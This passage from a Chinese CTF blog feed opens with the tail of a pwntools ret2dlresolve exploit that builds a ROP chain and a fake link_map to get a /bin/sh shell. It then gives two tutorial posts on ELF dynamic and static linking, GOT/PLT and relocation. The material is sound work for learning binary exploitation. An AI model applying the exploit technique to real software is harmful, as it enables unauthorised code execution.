class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#先调用read将数据写入.bss段</span></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#返回到pop rbp; retn，劫持栈。</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">system_write_offset=libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;write&#x27;</span>]    <span class="comment">#后面伪造link_map时l_addr的值</span></span><br><span class="line">success(<span class="string">&#x27;system_write_offset :&#x27;</span>+<span class="built_in">hex</span>(system_write_offset))</span><br><span class="line">fake_relplt_Elf64_Dyn_addr=fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line">fake_Elf64_Sym_addr=fake_link_map_addr+<span class="number">0x30</span></span><br><span class="line">fake_Elf64_Rela_addr=fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line">binsh_addr=fake_link_map_addr+<span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  标签，用不到可以随意设置</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  指向虚假的Elf64_Rela结构体的指针。因为reloc_offset被简化为0，所以该地址就是我们伪造的地址</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,这里让其写入一个可写地址即可，这里选择fake_link_map，因为我们的l-&gt;addr为system_write_offset那么r_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     index设置为0，最后一字节必须为7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   任意设置即可</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_name任意设置</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#保证st_info, st_other, st_shndx st_other非零r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   已经解析的函数got地址减去8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_size随意设置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  任意可读位置即可</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  指向fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  指向fake_relplt_Elf64_Dyn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(jmp_dl_fixup)</span><br><span class="line">payload+=p64(fake_link_map_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">payload+=fake_link_map</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>除去比赛花了两周时间终于把ret2dl总结完了，参考了网络上好多师傅的博客和资料，学到了好多，真心希望这篇博客也能帮助看见它的你。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-动态链接</title>
      <link href="/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写这篇博客的时候没有学习静态链接就去补了补知识，索性把这篇博客也改为基础知识，后面再写具体的攻击方法。看这篇前可以先了解一下静态链接。</p><h1 id="一些重要的section"><a href="#一些重要的section" class="headerlink" title="一些重要的section"></a>一些重要的section</h1><h2 id="“-interp”"><a href="#“-interp”" class="headerlink" title="“.interp”"></a>“.interp”</h2><p>当我们的系统将可执行文件装载之后，其中好多地址还处于无效状态，此时需要<strong>动态链接器</strong>通过映射的方法加载到进程的地址空间中。操作系统加载完动态链接器后，将控制权交给动态链接器的入口地址。动态链接器获取控制器，执行自身初始化工作，然后根据环境参数对可执行文件进行动态链接工作。当动态链接工作完成后将控制权交由可执行文件入口，程序开始正式执行。</p><p>而动态链接器的位置由谁来决定那？实际上是由ELF文件自己决定的，而决定这一切的section叫做<em><strong>.interp</strong></em>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210726111522241.png" alt="’.interp‘"></p><p>上图就是某个文件的’.interp’段，大多数情况下动态链接器都位于/lib里，但是这里我用patchelf更改过了，也说明这里是可以更改的，由ELF文件自己决定的。</p><p>这个段的内容很简单，里面就保存了上面这样的字符串，而这个字符串就是动态链接器的路径。</p><h2 id="“-dynamic”"><a href="#“-dynamic”" class="headerlink" title="“.dynamic”"></a>“.dynamic”</h2><p>动态链接最为重要的结构就是<em><strong>.dynamic</strong></em>，这个段保存了动态链接库需要的最基本的信息，比如依赖于哪些共享对象、动态连接符号表的位置、动态链接重定位表位置、共享对象初始化代码的地址等。书上写这个section有点类似于ELF的文件头，确实，其形式更像是ELF Header，而我觉得这个部分功能上更接近SHT，有着和SHT相似的功能，都是帮助我们寻找到section的，或许可以说是二者的结合。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727162459172.png" alt="&#39;.dynamic&#39;"></p><p>其结构体为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>NEEDED</td><td>依赖的共享对象文件</td></tr><tr><td>INIT</td><td>初始化代码地址，也就是.init的位置</td></tr><tr><td>FINT</td><td>是结束代码地址，也就是.fini的位置</td></tr><tr><td>GUN_HASH</td><td>动态链接哈希表地址</td></tr><tr><td>STRTAB</td><td>动态链接字符串表的位置，表示.dynstr的位置</td></tr><tr><td>SYMTAB</td><td>动态链接符号表的位置,表示.dynsym的位置;</td></tr><tr><td>PLTGOT</td><td>指向.got的位置</td></tr><tr><td>JMPREL</td><td>表示重定位表，也就是.rel.plt</td></tr><tr><td>REL\RELA</td><td>表示动态链接重定位表的位置;RELENT/RELAENT表示动态重读位表入口数量</td></tr></tbody></table><p>在静态链接中我们是通过</p><h2 id="“-dynsym”-”-dynstr”-amp-”-hash”"><a href="#“-dynsym”-”-dynstr”-amp-”-hash”" class="headerlink" title="“.dynsym”,”.dynstr”&amp;”.hash”"></a>“.dynsym”,”.dynstr”&amp;”.hash”</h2><p>在静态链接中有一个专门的段叫做<em><strong>.symtab</strong></em>,里面保存了所有关于该目标的符号的定义和引用.而为了表示动态链接模块间的符号导入导出关系,ELF专门有一个叫做<strong>动态链接符号表</strong>的段用来保存这些信息,也就是<em><strong>.dynsym</strong></em>.</p><p>重要的是”.dynsym”只保存了动态链接相关的符号,而模块内私有的变量则不会保存，这一点和静态链接中符号表是相似的.通常动态链接的模块同时包含:”.symtab”和”。”.dynsm“这两个段。”.symtab”包含所有的符号,也包括”.dynsym”中的符号.</p><p>“.strtab”,一个用于保存符号名的字符串表.而”.cybsym”对应的就是动态符号字符串表</p><p><em><strong>.dynstr</strong></em>.用于动态链接中我们需要在程序运行的时候查找符号,为了加快符号的查找过程,往往通过<strong>符号哈希表</strong>—<em><strong>.hash</strong></em>来加快符号查找速度，这个是动态链接独有的.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170027080.png" alt="&#39;.dynsym&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170510147.png" alt="&#39;.hash&#39;"></p><h2 id="“-rel-dyn”-amp-”-rel-plt”"><a href="#“-rel-dyn”-amp-”-rel-plt”" class="headerlink" title="“.rel.dyn”&amp;”.rel.plt”"></a>“.rel.dyn”&amp;”.rel.plt”</h2><p>静态链接中有<em><strong>.rel.text</strong></em>(代码段重定位表)和<em><strong>.rel.data</strong></em>(数据段重定位表)作为静态链接中用于表示重定位信息的重定位表.</p><p>在动态链接中自然也有与之对应的重定位表<em><strong>.rel.dyn</strong></em>,<em><strong>.rel,plt</strong></em>.”rel.dtn”实际上是对数据引用的修正,它所修正的位置位于”.got”以及数据段;而”.rel.plt”是对函数引用的修正,它所修正的位置位于”.got.plt”.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180200847.png" alt="&#39;.rel.fyn&#39;&amp;&#39;.rel.plt&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180447657.png" alt="SHT"></p><h1 id="动态链接和静态链接不同以及解决方法"><a href="#动态链接和静态链接不同以及解决方法" class="headerlink" title="动态链接和静态链接不同以及解决方法"></a>动态链接和静态链接不同以及解决方法</h1><p>动态链接和静态链接相同需要解决符号解析和重定位的问题，这部分和静态链接是差不多的，只有其指令修正方式会有所不同。最大的问题在于：<strong>由于其共享库数量不能确定，我们不可能进行Segement 合并</strong>，当加载多个共享库时，所有的共享库都需要驻留在Mmap中，独自占有一块空间。因此共享库需要支持任意地址被加载，共享库的起始位置只有当运行的时候才会被确定。</p><h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>为了可以解决动态链接中出现的这些问题，这里采取PIC技术。PIC的实现依赖于一个事实：EOF文件的Segment是按照它们在磁盘文件中的结构被复制到运行内存的。这一点可能对于我们来说司空见惯了，EOF文件中任何一个付号对于文件的偏移在加载到内存后都是固定的。然而这是实现PIC的关键所在，因为这样的话，<strong>任何两个符号之间的偏移就会变成一个固定的值</strong>。</p><p>PIC通过<strong>全局偏移表</strong>也就是我们经常劫持的GOT表来实现，GOT被储存在.data段中，正如我们上面所说的其关于.text的偏移是固定的。当GOT表在磁盘上的时候其值是为空的，只有当EOF文件被加载到内存后，才有可能让动态链接器根据重定位表和符号表找到符号的绝对地址，将其写入got表。</p><h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><p>GOT解决了共享库的全局变量引用，但是我们还要处理函数调用。这里就需要<strong>函数链接表</strong>：PLT表。</p><p>因为我们不可以修改.text段，所以我们需要采用GOT加PLT的方法，PLT表跳转的位置指向GOT表储存的地址。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>ELF下的<strong>延迟绑定</strong>过程——<em><strong>PLT</strong></em>，在ELF文件中当我们调用函数都是通过一个叫做PLT项的结构来进行跳转的，假设我们有一个bar()函数，其在PLT中的地址我们称为bar@PLT。那么其实现为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>bar@plt的第一条通过GOT间接跳转指令，假设我们已经进行过延迟绑定，此时bar@GOT里存放这我们真正的bar函数对应的项，那么这个跳转指令自然会跳转到我们想要的地方。但是，如果还没有进行过延迟绑定那，那么此时这里存放的必定不是我们想要的地址，<strong>此时bar@GOT存放的其实是bar@plt的第二条指令</strong>，第二条指令是将一个数字n压入栈里，而这个数字是<strong>bar这个符号引用在重定位表”.rel.plt”的下标</strong>。接下来又一个push将指令模块的ID压入栈中，最后再跳转到**_dl_runtime_resolve**。</p><p>当bar()这个函数被解析过一次，那么下次调用就不用再次重定位，只需要直接跳转到bar()函数中。ELF将GOT拆为两个表”.got”和 “.got.plt”，其中”.got”来报存全局变量引用地址，”.got.plt”保存函数引用地址。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>以上基本阐述了动态链接的过程，接下来就是**_dl_runtime_resolve**这个函数的问题了。这个留在ret2dl再讨论吧</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-link</title>
      <link href="/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/"/>
      <url>/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们rop里有一种高级的攻击方法ret2dl，它和动态链接有关，在我去学习ret2dl时发现自己对ELF文件中的一些section不是那么熟悉，而且不了解静态链接是怎么完成的，对动态链接的过程有些不知所措，这里总结一下最近学习的静态链接以及其相关section对ret2dl做一些补充说明。我这里只表述我认为的静态链接最为关键的部分，如果对其他方面有兴趣可以在参考部分寻找需要的资料。</p><h1 id="ELF结构"><a href="#ELF结构" class="headerlink" title="ELF结构"></a>ELF结构</h1><p>ELF文件最前方的是<strong>ELF文件头</strong> (<strong>ELF Header</strong>)，包含着文件的基本信息，接下来就是ELF文件的各种段。在这些不同的段中最为重要的就是<strong>段表</strong>(<strong>section Header Table</strong>)，也就是<em><strong>SHT</strong></em>，这个段表述了ELF文件中包含的所有段信息。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809165314132.png" alt="ELF结构"></p><p>我们先看看链接器是如何分析一个ELF文件的</p><h1 id="静态链接的重要section，以及链接器的分析"><a href="#静态链接的重要section，以及链接器的分析" class="headerlink" title="静态链接的重要section，以及链接器的分析"></a>静态链接的重要section，以及链接器的分析</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -h &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看一个ELF文件的文件头，这里不妨查看libc的ELF Header</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809170056849.png" alt="ELF Header"></p><p>通过上图可以看到ELF文件里定义了很多东西，包括魔数、文件机器字节长度、储存方式等信息，而这里对我们静态链接过程中最为重要的就是<strong>Start of section headers</strong>，这里是我们段表在文件中的偏移，通过上图我们知道段表在文件的第1864377字节开始。而链接器也会通过该项找到我们SHT的位置。</p><h2 id="Section-Header-Table-SHT"><a href="#Section-Header-Table-SHT" class="headerlink" title="Section Header Table(SHT)"></a>Section Header Table(SHT)</h2><p>我们的ELF文件中有各种各样的不同段，而段表就是记录这些段的基本，通过上面查看的ELF Header可以得到段表的起始位置为1864377 Bytes，每个表项大小是64 Bytes，一共是72项</p><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -S &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看每个段的具体信息</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809175848346.png" alt="SHT"></p><p>SHT每项包含</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>Section name：这里存放的是其name字符在字符串表的偏移</td></tr><tr><td>sh_type</td><td>Section type：表示该段的类型，例如.text是程序段</td></tr><tr><td>sh_flag</td><td>Section flag：表示该段的标志位</td></tr><tr><td>sh_addr</td><td>Section Address：段虚拟地址</td></tr><tr><td>sh_offset</td><td>Section Offset：段偏移 表示该段在文件中的偏移</td></tr><tr><td>sh_size</td><td>Section Size：该段长度</td></tr><tr><td>sh_link</td><td>Section Link：链接有关段专属,段链接信息</td></tr><tr><td>sh_info</td><td>Section information：同上</td></tr><tr><td>sh_addralign</td><td>Section Address Alignment：段地址对齐方式</td></tr><tr><td>sh_entsize</td><td>Section Entry Size：如果该段有一些固定大小项，这里展示每项的大小</td></tr></tbody></table><p>有了这个SHT我们就可以找到任何一个想要找到的section在哪里了。这里链接器就可以知道所有段的位置和长度。而仅仅找到每个段的位置是不足以让来链接器完成链接的工作的，我们不能单单是把相似的section合并了事。</p><p>在runtime阶段，我们要调用一个变量或者函数是需要知道该函数或者是变量的位置的，这里就需要</p><p>对符号进行分析。这里也需要一个表来寻找不同的符号，去对符号进行解析。</p><h2 id="symbol-Table"><a href="#symbol-Table" class="headerlink" title="symbol Table"></a>symbol Table</h2><p>如果我们要定位到每个符号在ELF中的位置，这就需要一个section来表述这些符号，也就是<strong>.symtab</strong>(<strong>符号表</strong>)。我们知道C语言不难在函数的内部再次定义函数，所以一个ELF文件平分为两层：函数的内部、函数外部。<strong>外部的</strong>函数和变量是对链接可见的，所以它们可以被其他的ELF文件所引用，也就是符号。</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>st_name 保存了指向符号表中字符串表（位于.dynstr 或者.strtab） 的偏移地址，偏移地址存放着符号的名称，如 printf。</td></tr><tr><td>st_value</td><td>st_value 存放符号的值（可能是地址或者位置偏移量）。</td></tr><tr><td>st_size</td><td>st_size 存放了一个符号的大小，如全局函数指针的大小，在一个 32 位 系统中通常是 4 字节。</td></tr><tr><td>st_other</td><td>st_other 变量定义了符号的可见性。</td></tr><tr><td>st_shndx</td><td>每个符号表条目的定义都与某些节对应。st_shndx 变量保存了相关节头表的索引。</td></tr><tr><td>st_info</td><td>st_info 指定符号类型及绑定属性。</td></tr></tbody></table><h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>st_info分为两个部分<strong>Symbol Type</strong>和<strong>Symbol Binding</strong>。</p><p><em><strong>Bind：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>本地符号在目标文件之外是不可见的，目标文件包含 了符号的定义，如一个声明为 static 的函数。</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>全局符号对于所有要合并的目标文件来说都是可见 的。一个全局符号在一个文件中进行定义后，另外一个文件可以对这 个符号进行引用。</td></tr><tr><td>STB_WEAK</td><td>2</td><td>与全局绑定类似，不过比 STB_GLOBAL 的优先级低。 被标记为 STB_WEAK 的符号有可能会被同名的未被标记为 STB_WEAK 的符号覆盖。</td></tr></tbody></table><p><em><strong>Type：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE</td><td>0</td><td>符号类型未定义。</td></tr><tr><td>STT_OBJECT</td><td>1</td><td>该符号是一个数据对象，比如变量、数组等</td></tr><tr><td>STT_FUNC</td><td>2</td><td>表示该符号与函数或者其他可执行代码关联。</td></tr><tr><td>STT_SECTION</td><td>3</td><td>该符号表示一个段，这种符号必须是STB_LOCAL的</td></tr><tr><td>STT_FILE</td><td>4</td><td>该符号表示文件名，一般是该目标文件对应的源文件名，它一定是STB_LOCAL类型的，并且它的st_shndx一定是SHN_ABS</td></tr></tbody></table><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>0xfff1</td><td>表示该符号包含一个绝对的值，比如文件名的符号</td></tr><tr><td>SHN_COMMON</td><td>0xfff2</td><td>表示该符号是一个“common块”类型的符号，一般未初始化的全局符号就是这种类型的。</td></tr><tr><td>SHN_UNDEF</td><td>0</td><td>表示该符号未定义。这个符号表示该服符号在目标文件被引用，但定义在其他目标文件中</td></tr></tbody></table><p>以上就是除了重定位段以外关于静态链接的的核心section。重定位我们在后面讨论静态链接的过程中再讨论。</p><h1 id="静态链接过程"><a href="#静态链接过程" class="headerlink" title="静态链接过程"></a>静态链接过程</h1><h2 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h2><p> 静态链接的第一步需要符号解析，在ELF文件被读入内存后，不同的文件可能有相同的符号名。符号解析需要解决这种冲突，需要在所有的ELF中选择一个作为该符号的定义，当然对于局部符号而言是不需要考虑不同文件件的冲突问题的。</p><p>对于全局符号而言其有四种状态</p><table><thead><tr><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>Defined(有定义)</td><td>该符号在ELF文件中有确切的位置来储存其数值</td></tr><tr><td>Tentative(临时定义)</td><td>该符号没有确定的储存空间，也就是在SHN_COMMON中的全局变量，在编译阶段无法确定其最最终归属</td></tr><tr><td>Undefined(未定义)</td><td>该符号没有储存空间，也就是其属于SHN_UNDEF段</td></tr><tr><td>Weak Bind(弱定义)</td><td>该符号属于弱定义，也就是其bind为STB_WEAK</td></tr></tbody></table><p>这些符号的优先级为<strong>Undefined &lt; Weak Bind &lt; Tentative &lt; Defined</strong></p><p>全局符号只能存在一个，当出现重复的全局符号时只能选择一个作为目标文件的符号，这里的四种符号，<strong>强符号只有Defined</strong>这一种，其余三项都是弱符号</p><p>而选择符号有以下条规则：</p><ul><li>当存在强符号，且只有这一个强符号时，选择该强符号</li><li>当同时存在多个强符号时，链接器无法处理，报错</li><li>当没有强符号存在时，按照优先级选择一个弱符号</li></ul><p>大多数情况下可以通过这个规则选择出需要的符号，但若在最后一种情况下出现type和size的区分有时候链接器也会无法做出决定。</p><p>经过这一步链接器就将不同的ELF文件中的符号全部处理完成了</p><h2 id="Section-merge"><a href="#Section-merge" class="headerlink" title="Section merge"></a>Section merge</h2><p>当我们的符号解析完成后，接下来就是对相同类型的section进行合并。通过被解析的符号，将相同section的符号放在同一section，这样我们就确定了每个符号在EOF文件中的大小和起始位置，建立起一个映射关系。合并起来的section被称作Segment。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210810182800665.png" alt="Section合并"></p><h2 id="引用重定位"><a href="#引用重定位" class="headerlink" title="引用重定位"></a>引用重定位</h2><p>完成符号解析和section合并后基本EOF文件成型，但是函数或者变量之间的调用位置还没有写入，这时就需要对所有的符号进行重定位。</p><p>我们先来看看重定位表的结构</p><h3 id="Relocation-Table"><a href="#Relocation-Table" class="headerlink" title="Relocation Table"></a>Relocation Table</h3><p>对于可以重定位的ELF文件来说，它必须有重定位表。对于每个要被重定位的ELF段都有一个对应的重定位表。对应.text有<strong>.rel.text</strong>，对于.data有<strong>.rel.data</strong>。每个要被重定位的地方叫做重定位入口。</p><p>重定位入口结构为：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>重定位入口的偏移，这个值表示该重定位入口所要修正的位置的第一个字节相对于段的偏移</td></tr><tr><td>r_info</td><td>重定位入口的类型和符号，一部分表示重定位入口的类型，一部分是重定位入口在符号表的下标</td></tr></tbody></table><p>链接器知道了以上两个成员就知道了在哪里进行重定位，又重定位到哪里去。</p><p>而重定位的类型则对应着多种多样的寻址模式，而重定位的基本类型分为相对寻址和绝对寻址。</p><h3 id="两种指令修正方式"><a href="#两种指令修正方式" class="headerlink" title="两种指令修正方式"></a>两种指令修正方式</h3><p>我们先设：</p><p><strong>A = 保存在被修正位置的值</strong></p><p><strong>P = 被修正的位置，可以通过r_offset得到</strong></p><p><strong>S = 符号的实际地址，这个可以通过r_info得到</strong></p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>对与相对寻址而言，我们先通过重定位表的r_offset找到了<em><strong>P</strong></em>，也就是我们要修改的位置。</p><p>然后通过r_info找到对应要引用符号的的符号表，也就找到了<em><strong>S</strong></em>，符号的相对位置。</p><p>仅仅这样是不够的我们还要考虑rip指针在引用时的位置，这由指令本身决定，在被要被修改的地方保存着这值<em><strong>A</strong></em>。</p><p>那么相对寻址要修改为<em><strong>S-P+A</strong></em>。这样我们就实现了相对寻址。</p><h4 id="绝对寻址"><a href="#绝对寻址" class="headerlink" title="绝对寻址"></a>绝对寻址</h4><p>绝对寻址就不用考虑二者的偏移，只需要考虑S和A即可，既写入的是S+A。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这些就是静态链接的一些基本的框架了，了解了这些也就基本了解了链接的大致过程。学习这一块翻了好多书，也看了些视频，我会列在下面的参考资料里，有不明白的地方供大家参考。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>哔哩哔里up主<em><strong>yaaangmin</strong></em>的视频：深入理解计算机系统合集(<a href="https://www.bilibili.com/video/BV17K4y1N7Q2">https://www.bilibili.com/video/BV17K4y1N7Q2</a>)</p><p>以及其编写的文档：<a href="https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3">https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3</a> </p><p><em><strong>《深入了解计算机系统(csapp)》</strong></em></p><p><em><strong>《程序员的自我修养——链接、装载与库》</strong></em></p><p><em><strong>《linux二进制分析》</strong></em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF July X CBCTF 4th pwn</title>
      <link href="/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/"/>
      <url>/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/</url>
      
